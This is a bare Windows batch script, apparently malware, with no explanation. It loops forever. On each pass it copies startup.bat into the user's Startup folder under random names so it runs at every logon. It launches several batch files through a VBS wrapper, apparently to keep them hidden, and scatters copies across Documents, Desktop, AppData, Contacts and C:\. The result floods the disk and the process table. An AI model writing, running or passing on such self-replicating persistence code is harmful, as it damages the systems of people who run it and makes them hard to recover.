@echo off
:loop
copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\d%random%d.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\filel.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\file.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\sigma.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\copy.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\startup.bat
copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\Documents\mk%random%4.bat
copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\Desktop\mk%random%4.bat
copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\AppData\mk%random%4.bat
copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\Contacts\mk%random%4.bat
copy %PUBLIC%\sigma\startup.bat C:\mk%random%4.bat
goto loop
